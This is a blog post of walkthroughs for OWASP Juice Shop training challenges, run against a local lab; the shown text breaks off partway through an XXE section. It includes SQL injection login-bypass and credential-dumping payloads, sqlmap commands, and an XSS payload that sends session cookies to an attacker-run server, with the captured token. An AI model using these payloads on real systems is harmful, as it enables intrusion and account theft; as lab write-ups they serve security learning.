---
title: "Hacking the Juice Shop"
excerpt: A collection of walkthroughs of different hacking challenges surrounding the OWASP Juice Shop 
date: 2026-02-05
---

This blogpost is a selection of walkthroughs of some of the hacking-challenges found in the OWASP Juice Shop that I considered particularly interesting.

> Work in progress! The write-ups are ordered by categories that are found in `/#/score-board` on the web application.


### Table of Contents
1. [Sensitive Data Exposure](#1-sensitive-data-exposure)
   1. [Accessing Sensitive Documents](#11-accessing-sensitive-documents)
   2. [Meta Geo Stalking](#12-meta-geo-stalking)
2. [Broken Access Control](#2-broken-access-control)
   1. [Pulling User-Data as a Low-Privilege User](#21-pulling-user-data-as-a-low-privilege-user)
   2. [View Basket](#22-view-basket)
3. [Injection](#3-injection)
   1. [Login Admin](#31-login-admin)
   2. [Database Schema & User Credentials](#32-database-schema--user-credentials)
4. [Miscellaneous](#4-miscellaneous)
   1. [Security Policy](#41-security-policy)
   2. [CAPTCHA Bypass](#91-captcha-bypass)
5. [Unvalidated Redirects](#5-unvalidated-redirects)
   1. [Outdated Allowlist](#51-outdated-allowlist)
6. [XSS](#6-xss)
   1. [Reflected XSS](#61-reflected-xss)
7. [Improper Input Validation](#7-improper-input-validation)
   1. [Deluxe Fraud](#71-deluxe-fraud)
   2. [Payback Time](#72-payback-time)
8. [Cryptographic Issues](#8-cryptographic-issues)
   1. [Weird Crypto](#81-weird-crypto)
   2. [Nested Easter Egg](#82-nested-easter-egg)
9. [XXE](#9-xxe)
   1. [XXE Data Access](#91-xxe-data-access)

<br>


## 1. Sensitive Data Exposure

### 1.1 Accessing Sensitive Documents

One of the first things I did while doing reconnaissance on the Juice Shop was to run `dirbuster`, in hopes of finding subdirectories that are easily missed but might still contain useful information. I simply ran

```console
dirb http://localhost:3000/ -o dirb_output
```

The output showed several results, namely 

```shell
---- Scanning URL: http://127.0.0.1:3000/ ----
+ http://127.0.0.1:3000/assets (CODE:301|SIZE:156)
+ http://127.0.0.1:3000/ftp (CODE:200|SIZE:11298)
+ http://127.0.0.1:3000/profile (CODE:500|SIZE:1051)
+ http://127.0.0.1:3000/promotion (CODE:200|SIZE:6586)
+ http://127.0.0.1:3000/redirect (CODE:500|SIZE:3339)
+ http://127.0.0.1:3000/robots.txt (CODE:200|SIZE:28)
+ http://127.0.0.1:3000/video (CODE:200|SIZE:10075518)
+ http://127.0.0.1:3000/Video (CODE:200|SIZE:10075518)
```

The most interesting information is contained in `/ftp`, as can be seen in this screenshot:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d6c9f93d-adba-4476-a62f-8e92da40a1dd"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Right away we can access the files `acquisitions.md`, `legal.md` and `announcement_encrypted.md`, but it seems like no other file formats are allowed to be viewed. We can bypass this issue by making use of the poison null-byte trick, i.e. instead of trying to view `/ftp/eastere.gg`, we enter `/ftp/eastere.gg%2500.md` and then we can successfully view the content. The same goes with `coupons_2013.md.bak`, `package.json.bak` and `suspicious_errors.yml`. 

<br>


### 1.2 Meta Geo Stalking

> Determine the answer to John's security question by looking at an upload of him to the Photo Wall and use it to reset his password via the Forgot Password mechanism.

As the task suggests, we should look at the meta data of a photo that John uploaded. I went through the photo wall and discovered an image that seemed to be uploaded by John:

<div class="flex justify-center items-center">
  <center>
     <img
       src="https://github.com/user-attachments/assets/7e2a7a7b-969f-417e-9aa7-c40702aa2d65"
       alt="image"
       class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
     />
  </center>
</div>
<br>

From the challenge [User Credentials](#32-database-schema--user-credentials) we know that John's e-mail address is `john@juice-sh.op`. Entering this in the "Forgot Password" form, we find that John's security question is "What's your favorite place to go hiking?". Thus, my idea was to try and find coordinates in the uploaded photo's meta data from which we can infer the security question.

I couldn't remember the tool to extract meta data, so I first tried `file`:

```console
┌──(kali㉿kali)-[~/projects/juice-shop/pictures]
└─$ file favorite-hiking-place.png             
favorite-hiking-place.png: PNG image data, 471 x 627, 8-bit/color RGB, non-interlaced
```

This was not useful yet, but I found [this](https://superuser.com/a/370982) Stackexchange answer suggesting `identify -verbose`. This yielded a ton of information, the most interesting part of which is seen below:

```console
┌──(kali㉿kali)-[~/projects/juice-shop/pictures]
└─$ identify -verbose favorite-hiking-place.png
...
exif:GPSLatitude: 36/1,57523/1000,0/1
exif:GPSLatitudeRef: N
exif:GPSLongitude: 84/1,20893/1000,0/1
exif:GPSLongitudeRef: W
...
```

Using a Google search, these coordinates turn out to be `36.958717, -84.348217`, which point to a national park in the United States, namely the "Daniel Boone National Forest". I didn't expect this to work right away, but I entered this as the security question and changed the password to "123456". To my astonishment this actually solved the challenge!

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/f16a3200-51d1-4ab8-88b1-ff005d7ed852"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/edef9f09-f048-4b46-98f2-efffe10c012d"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>











## 2. Broken Access Control

### 2.1 Pulling User-Data as a Low-Privilege User

At the end of this challenge we will have pulled an exhaustive list of usernames and e-mail addresses. While this may not be quite as devastating as a specific SQL-injection payload with which one can additionally obtain all hashed passwords, we're still able to read data which should be out of reach.

To begin with, I logged in as user Jim with `jim@juice-sh.op:ncc-1701`. I obtained these credentials through the earlier challenges "Login Jim" and "Reset Jim's Password" using SQL injections, weak password reset functionality and OSINT. To confirm that Jim only has customer privileges and no admin rights, we navigate to `http://localhost:3000/#/administration` and find that we cannot access the page:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/84d4fce8-968f-4db5-8e79-2ae4b42940c5"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

While investigating XSS vulnerabiities in another challenge, I noticed that there exists an API endpoint called `/api/`, which popped up in Burp Suite as a GET request of the form `GET /api/Quantitys/ HTTP/1.1` when entering a payload into the search bar of the Juice Shop. 

The endpoint `/api/Quantitys/` itself contained nothing too serious, but the lucky idea I had was to investigate the endpoint `/api/users/`, since I thought there might be a good chance that this exists. So as this this low-privilege user, I proceeded as follows: First, it seems like the endpoint existed, since I only got a 401 error saying that no authorization header was found, but not a 500 error code for instance.

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/3c2766bd-1584-472b-b0ab-948aa3882fae"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

I remembered from the endpoint `/api/Quantitys/` that the request header contained an authorization token, as can be seen here in Burp:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/dfece9b4-035d-4b7b-b6e7-0d96d798f825"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

So the idea was to simply copy the token and paste it into the request header for the endpoint `/api/users`. After sending the request to the repeater in Burp and adding the token, we indeed get a 200 response and we can view a list of all users with e-mails and additional information:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/0a1a3c35-7fe6-48ad-abde-35626eafb57f"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

For completeness, here are the last few entries of this list:

```
{
  "id": 20,
  "username": "SmilinStan",
  "email": "stan@juice-sh.op",
  "role": "deluxe",
  "deluxeToken": "8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39",
  "lastLoginIp": "",
  "profileImage": "assets/public/images/uploads/20.jpg",
  "isActive": true,
  "createdAt": "2025-12-14T14:06:03.182Z",
  "updatedAt": "2025-12-14T14:06:03.182Z",
  "deletedAt": null
},
{
  "id": 21,
  "username": "evmrox",
  "email": "ethereum@juice-sh.op",
  "role": "deluxe",
  "deluxeToken": "b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff",
  "lastLoginIp": "",
  "profileImage": "assets/public/images/uploads/default.svg",
  "isActive": true,
  "createdAt": "2025-12-14T14:06:03.183Z",
  "updatedAt": "2025-12-14T14:06:03.183Z",
  "deletedAt": null
},
{
  "id": 22,
  "username": "",
  "email": "testing@juice-sh.op",
  "role": "admin",
  "deluxeToken": "",
  "lastLoginIp": "",
  "profileImage": "assets/public/images/uploads/defaultAdmin.png",
  "isActive": true,
  "createdAt": "2025-12-14T14:06:03.183Z",
  "updatedAt": "2025-12-14T14:06:03.183Z",
  "deletedAt": null
}
```

As mentioned above, this information disclosure may not be catastrophic right away. However, it does give us a large attack surface with which we can potentially do more damage in future challenges.

For instance, we can now try to brute-force passwords more easily, since we already have e-mails which are used for logins. Moreover, we see all users with admin privileges, so we might want to focus on these accounts in particular. Lastly, we could now try extensive phishing-campaigns and we can try to exploit the `deluxeToken` that comes with some of the users.

As a last note, I believe this technically does not solve any official Juice Shop challenge. At least I never triggered any success-banner that you usually see when solving a task.


### 2.2 View Basket

> View another user's shopping basket.

My idea was to log in as a normal user, say Jim, and intercept a request to Jim's shopping basket in Burp Suite. Then we could find out how exactly the request is handled and what endpoint we should further investigate.

After logging in with `jim@juice-sh.op:ncc-1701` I intercepted the request to the basket and found that there is a call to the endpoint `/rest/basket/2`. However, when navigating to `http://localhost:3000/rest/basket/2`, I got an authorization error:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/1ed70d61-5b5c-496c-876d-747eeb85aefa"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

But from logging in as Jim earlier, we were given an Authorization-Bearer token, which I found in the HTTP history in Burp Suite. I tried intercepting the request to `http://localhost:3000/rest/basket/2` and adding the Authorization-Bearer before forwarding. This time it worked and I could view the contents of the basket as a raw text-output.

Now the trick was to repeat this process with a different basket. I chose `/rest/basket/1` and simply added the same Authorization token that I got from Jim. Luckily this worked! After forwarding the request I could view the basket of user 1 (aka the Admin!):

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/2ff99537-6694-4cfc-892a-c607847753af"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

This triggered the success banner, thus finishing the challenge.
<br>


## 3. Injection

### 3.1 Login Admin

The Juice Shop contains many different SQL injection vulnerabilities, the easiest of which being a vulnerability in the login page.

In order to test for SQL injection vulnerabilities, I entered the classic testing-payload `'` into the user e-mail field together with any random password. This will yield an intersting error message in Burp Suite:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/8f846b4b-4893-41bc-beeb-dad080001c90"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

We see that there seems to be a vulnerability here, since we can directly talk to the database in the backend and trigger an SQL error. Next, I sent the above request to the intruder and used the standard SQLi wordlist `~/SecLists/Fuzzing/Databases/SQLi/Generic-SQLi.txt` to fuzz the user input. Already, the attack looked promising, since it returns different http-error-codes after only the first 13 payloads out of 268 in total:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d36236b8-6a78-48a3-9ec3-33eddc3cb2d7"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

We saw earlier in the error with only `'` that the syntax is as follows:

```sql
SELECT * FROM Users WHERE email = '${userInputEmail}' AND password = '${hashedPassword}' AND deletedAt IS NULL;
 ```

 So if we used a payload like `' or '1'='1'--` (line 231 in the intruder output, code 500), then really in the backend we get
 
```sql
SELECT * FROM Users
WHERE email = '' OR '1'='1' --'
AND password = 'e0227fa7fa03f2a1644a86c973da4d91'
AND deletedAt IS NULL
```

and more importantly, everything after `--` is simply ignored, and hence we force an **authentication bypass**, since it is entirely irrelevant what password we pass into the login field. Better yet, if we bypass the authentication process in this way, we are automatically logged in as `admin@juice-sh.op`! This is simply because the user `admin` is the very first user in the list of all users, and this user is picked by virtue of the above payload. 

<br>


### 3.2 Database Schema & User Credentials

For this exercise, I wanted to try the "Database Schema" challenge, since leaking an entire database together with hashed passwords felt like the holy grail to me. 

My first attempt was to try and tinker more with the login form, since this allowed for an SQL injection in the previous exercise. However, this did not go very far, since we can study the error message after entering "`'`" to find that we are already inside the `Users` table upon sending the login form request.

The hint on the Juice Shop score board said the following:

> Find out where this information could come from. Then craft a UNION SELECT attack string against an endpoint that offers an unnecessary way to filter data.

I remembered there being a parameter for pulling information from the database when searching for items using the page's search bar. More precisely, this was the endpoint `/rest/products/search?q=`. This potentially looks like an unnecessary way to filter data for several reasons:

1. No pagination: It likely returns ALL matching products at once
2. No filtering/sorting options: Limited to just keyword search
3. No caching: Hits database on every request
4. No rate limiting: Could be abused for DoS attacks

Upon setting `q='` as the parameter, I did not trigger an error and just received an empty list. In order to fuzz this parameter for any vulnerabilities, I decided to run `sqlmap`:

```console
sqlmap -u http://localhost:3000/rest/products/search?q= --dbs --level=2 --risk=2
```

Note that `--dbs` tries to enumerate database names and `--level`/`--risk` determine how thoroughly the tests are performed. Part of the output was the following:

```
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=') AND 4318=4318 AND ('MUaO' LIKE 'MUaO
---
```

This tells us that the parameter is indeed vulnerable. While this exact payload did not work for me, I could slightly modify it and then URL-encode all key characters in Burp, and this would give me an SQL error message:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/073ea41b-24a1-45e1-b39f-b24cf31bd78c"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Now the goal was to somehow include a `UNION SELECT` command within this injection payload. Before we do so, we can use `sqlmap` once more to try and automate the enumeration of the database schema. I used the following command:

```console
sqlmap -u http://localhost:3000/rest/products/search?q= --schema
```

This returned 20 tables and for each one it returned its respective schema, albeit in an ugly format. This is the schema for the "Users" table, for instance:

```sql
[INFO] retrieved: CREATE TABLE `Users`
(
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`username` VARCHAR(255) DEFAULT '',
`email` VARCHAR(255) UNIQUE,
`password` VARCHAR(255),
`role` VARCHAR(255) DEFAULT 'customer',
`deluxeToken` VARCHAR(255) DEFAULT '',
`lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
`profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
`totpSecret` VARCHAR(255) DEFAULT '',
`isActive` TINYINT(1) DEFAULT 1,
`createdAt` DATETIME NOT NULL,
`updatedAt` DATETIME NOT NULL,
`deletedAt` DATETIME
)
```

Technically this finishes the challenge, but of course this would be somewhat boring (and this did not trigger the challenge success banner!). After getting stuck for a while, I noticed that I had read the error in the previous screenshpt incorrectly: the payload should rather begin with something like `asdf'))` instead of just `')`, since there are two parentheses that need closing, and adding `asdf` just ensured that no empty string is parsed and throws pathological errors:

<div class="flex justify-center items-center">
  <center>
    <img
      src="https://github.com/user-attachments/assets/77f7c3ea-d2bd-4b40-aaba-e412f6f351fb"
      alt="image"
      class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
    />
  </center> 
</div>
<br>

Some online research told me that I should try a payload like `UNION SELECT sql FROM sqlite_master`, since this is a table containing all schemas that comes with the SQLite database by default. Now I had to find out the number of tables (remember `sqlmap` told us there are 20, but this can be highly inaccurate!). Checking by hand as seen below, I found 9 tables:

```sql
asdf')) UNION SELECT sql FROM sqlite_master --             --> 500 error
asdf')) UNION SELECT sql,'2' FROM sqlite_master --         --> 500 error 
asdf')) UNION SELECT sql,'2','3' FROM sqlite_master --     --> 500 error
...
...
(Test until "200 OK" response)
```

One important caveat was that I had to URL-encode key characters again, because otherwise I would always get a 400 error code:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/1c26678b-35d3-4a36-84c3-5c9ce399db15"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/cbc86699-963e-422e-b211-b65be7d35899"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

The second screenshot's response contains the entire database schema, and I believe at this point the success banner was triggered!

Finally, we can modify the payload to obtain the database schema one more time, in order to exfiltrate a list of (hashed) user credentials. Remember from earlier that we know exactly what the "Users" schema looks like. Thus, we can tell the backend to return, say, `id`, `email`, `password`, `role` and `deluxeToken`, all useful information from our perspective. The payload then looks as follows:

```sql
asdf')) UNION SELECT id,email,password,role,deluxeToken,'6','7','8','9' FROM Users--
```

After URL-encoding the payload, we indeed get a full list of user credentials, which we can now try to crack and use for further challenges:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/581ebc57-614e-4d54-8bb6-fd7ac8652c4e"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>



## 4. Miscellaneous

### 4.1 Security Policy

Simply googling "common place for security policy on websites", I found that the most common subdirectory where the security policy is stored is `/.well-known`. Indeed, navigating to `http://localhost:3000/.well-known`, we find a file `security.txt`. Accessing this file triggers the success banner, which finishes this rather short task.




## 5. Unvalidated Redirects

### 5.1 Outdated Allowlist

> Let us redirect you to one of our crypto currency addresses which are not promoted any longer.

The only place to find a forgotten redirect is in the client-side javascript files, since we obviously cannot simply check the backend source code. Thus, I opened the "Debugger" (or "Sources") tab of the web developer tools and navigated to `main.js`, because this is the most obvious place where custom code may have been stored. In fact, this file contains credentials for a test-user, with which one solves the Juice Shop challenge "Exposed Credentials", so this file is quite valuable. 

Searching for the term "redirect", we get a hit after checking around ~20 candidates:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/4df0a9bf-3d56-4f9a-8e93-bca473fd95bf"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

We can simply follow this address by entering the following URL in the browser, which will solve the challenge:

```
http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
```
<br>



### 4.2 CAPTCHA Bypass

> Submit 10 or more customer feedbacks within 20 seconds.

First, I tried finding a CAPTCHA bypass: when filling out a customer feedback form (as `john@juice-sh.op` in this case), the body of the intercepted POST request looks like this:

```json
{
   "UserId":18,
   "captchaId":3,
   "captcha":"9",
   "comment":"Lots of feedback! (***n@juice-sh.op)",
   "rating":3
}
```

There is an obvious vulnerability here: the `captchaId`'s are numbered, i.e. there is no randomisation here, as long as we don't change the number 3 in this case!

I sent this request over to the Burp Suite Repeater, created a Group and duplicated the request nine times (in order to have 10 tabs in total). Then, I selected the "Send group (single connection)" setting and sent the requests. All ten went through and I got the success banner:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/4cefbe55-b3f5-4663-a5a5-4012f60d7f63"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/dc7d97cb-cb5b-4d17-945d-f82502a9b9f2"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>




## 6. XSS

### 6.1 Reflected XSS

> Perform a reflected XSS attack with `<iframe src="javascript:alert('xss')">`.

A first step could be to test the search field of the Juice Shop for cross-site scripting, as in the image below:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d002ff17-564b-40cf-aafb-fe3e95ca9289"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

This looks good, we already found an XSS-vulnerability, since the changed the structure of the page. Since we know what payload we have to include to solve the challenge, we can just enter it to get XSS:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/5190570d-4fe1-4164-b451-959ff3dfacda"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

This was rather easy, so I wanted to see if I could keep exploiting this vulnerability to exfiltrate a session cookie, since this is a tactic often employed by adversaries, in order to take over accounts for instance. In fact, doing so is straightforward.

Because I had seen the YouTube creator IppSec do so, I wanted to use a different payload, namely one based on the `img` and `onerror` tags.

First, we spin up a python web server using `python3 -m http.server`. This serves as the attacker website to which the cookie will be sent. Then, the victim should enter the following payload into the search field of the Juice Shop:

```html
<img src=x onerror="fetch('http://localhost:8000?c='+document.cookie)">
```

The parameter `src=x` makes no sense, which triggers the error, which sends the document cookie to the malicious server (`localhost:8000` in this case). But how can we get Jim to enter this into the search field? Surely he is not going to type this in by hand, even if we asked really nicely... One standard method is via phishing mails, i.e. we might obfuscate the following evil link to look harmless and get him to click this link via mail:

```
http://localhost:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch('http:%2F%2Flocalhost:8000%3Fc%3D'%2Bdocument.cookie)%22%3E
```

If Jim is logged in, we (the attackers) then receive Jim's Authorization Bearer token in the terminal via the web server:

```console
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

127.0.0.1 - - [25/Jan/2026 14:23:05] "GET /?c=language=en;%20cookieconsent_status=
dismiss;%20welcomebanner_status=dismiss;%20continueCode=1ZHYhKtkiQtncqIYTMCyFgfDhv
t3IOTX5u27tYnIMeTN3Fj4unrhPNI9psa8SVqUKXtyLc7bUn6UNPu8QI3QiW9fj4H48h9afjxs85;
%20token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6
eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZT
U0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tl
biI6IiIsImxhc3RMb2dpbklwIjoiMTI3LjAuMC4xIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy
9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwi
Y3JlYXRlZEF0IjoiMjAyNi0wMS0yMSAxMDozMTozMC40ODAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi
0wMS0yMSAxMDozMjozNC4xMDcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzY5MzU5Mjk5
fQ.wTKvqcbvSBagPGQELmM2OdNVufYhtt5PchN6uV_gdx8_0piYtTkEZ3xH9LYz5gbptwEQSfnoCQpDsSB
BWZMb-2kPzxRb85LvG8fh_iHTZF0nh84H6KLeu1hMY5YUkyfs3S5qON_zXn7wt1Kc5EqN1KbpwH7Q8i28s
JwIXqzgHPQ HTTP/1.1" 200 -
```

As a bonus, Jim himself never realizes what happened. The only hint that something malicious just took place is a small graphical bug on his screen, but nothing else.

Finally, I tried exploiting the fact that we just stole this cookie. The goal was to leave a bad review on an item in Jim's name.

To this end, I logged in using a throwaway account `user01@mail.com:123456` and wrote a bad review for a specific item. I submitted this review and intercepted this PUT request in Burp Suite. Here, I edited a few things:
- Changed the Authorization Bearer to Jim's exfiltrated token.
- Changed `X-User-Email` to `jim@juice-sh.op` (not 100% sure if necessary).
- Changed "author" to `jim@juice-sh.op` in the body.

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/2d7dd5e0-efa5-43fc-9fcd-536bb0616e61"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

After forwarding this request, the negative review is indeed posted in Jim's name, thus damaging his reputation or harming his public image.

<br>



## 7. Improper Input Validation

### 7.1 Deluxe Fraud

> Obtain a Deluxe Membership without paying for it.

I started by creating a new account to guarantee that I had no deluxe membership to begin with. After filling in the details for a credit card, I intercepted the submitted POST request to obtain a deluxe membership. This looked as follows:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/682c4dbd-73e5-4eaf-9128-4a4481d62523"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Originally it said "card", but I simply changed it to "none" in hopes of it being this easy. But it turned out that this is exactly what needed to be done:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/7e40b99f-b28a-4c81-81a9-227ae887f5a0"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>



### 7.2 Payback Time

> Place an order that makes you rich.

For a fresh start I created a new user account to ensure that my wallet balance was 0:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/08db0ee6-1626-482b-9fe5-8285338068d3"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

I placed one item in my basket for a total of 1.99. The challenge suggested I should try to exploit a vulnerability of a function within the basket. Right away, it seemed obvious that I should try to decrease the item quantity to any *negative* value, thus ensuring that the Juice Shop owes me money.

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/178b5a1a-2f17-4dfd-a45d-ab848de41991"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

I turned on the intercept in Burp Suite, clicked on the "+"-symbol and edited the "quantity" parameter to "-1000":

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/3fc9687b-fab6-4647-89c8-f3e0c7aa7d1f"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

After filling out the remaining order forms (address, delivery speed etc.), I arrived at the order confirmation page:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/e276805e-466b-4d61-8c71-18db74569641"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

The purchase went through successfully, and I briefly checked my wallet to find that it now contained nearly 2000 dollars!

<div class="flex justify-center items-center">
  <center>
    <img
      src="https://github.com/user-attachments/assets/521c277e-8bd2-4145-82e0-1ad619640813"
      alt="image"
      class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
    />
  </center>
</div>
<br>







## 8. Cryptographic Issues

### 8.1 Weird Crypto

> Inform the shop about an algorithm or library it should definitely not use the way it does.

This is a rather short challenge. Throughout many different challenges (retrieving a list of user credentials, meta geo stalking, etc.) I noticed that the web app uses the MD5 hashing algorithm to store hashed user passwords. This is bad practice, as this algorithm is largely insecure these days. I simply entered "md5" in the Customer Feedback form and triggered the success banner.

<br>


### 8.2 Nested Easter Egg

> Apply some advanced cryptanalysis to find the real easter egg.

This challenges contitutes the continuation of the challenge "[Accessing Sensitive Documents](#11-accessing-sensitive-documents)", where we used the poison null-byte to read the file `eastere.gg` located in the `/ftp` subdirectory:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/9d6f2bb3-fbac-4c2f-80b1-80f9ab45c58a"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

The string in line 12 of the text file looks like a base 64 encoded string (a dead giveaway is the "=" symbol here). Using [Cyberchef](https://gchq.github.io/CyberChef/), we can base 64 decode the string and find that it reads as follows:

```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

This very much looks like a URL, but the words/strings do not make sense yet. I remembered from my first few modules on cryptography on TryHackMe that a standard (old-fashioned) encryption algorithm is the rotation cipher (also known as the Caesar cipher). So I used some random website to find the correct rotation, which turned out to be 13:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/a0c75547-7fec-4ecb-a7ad-0b4885358421"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Then all I did was visit the following URL to solve the challenge and look at a cool *spherical* easter-egg...

```
http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

<br>






## 9. XXE

### 9.1 XXE Data Access

> Retrieve the content of `C:\Windows\system.ini` or `/etc/passwd` from the server.

In order to exploit an XML External Entity vulnerability, I first had to find some foot hold from which to launch the attack. The hint provided some helpful context in this case:

> The leverage point for this challenge is the deprecated B2B interface.

This made me consider the file upload functionality in the "Complaint" section of the Juice Shop. After logging in as a user and filling out a mock complaint, I first intercepted the POST request where I simply submitted a harmless pdf:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/23c85d14-3375-4338-9a20-67e907bbb61e"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

The goal was obviously to force some kind of file read, so I started by changing the content and filename in the proxy:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/0449b81e-5787-42f4-a776-2ef5a41e8146"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

As expected, this changed nothing. Of course this is no surprise, since the challenge asks us to use XML entities somehow. So I started reading more into classical XXE payloads. One method I came across used embedded SVG's, i.e. vector graphics, so I tried copying the payload. After some tweaking I at least got a `410 Gone` response, as opposed to the `204 No Content` which I was getting previously:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/48760381-03f5-4df2-be67-d373f4779dcd"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

<div class="flex justify-center items-center">
  <img
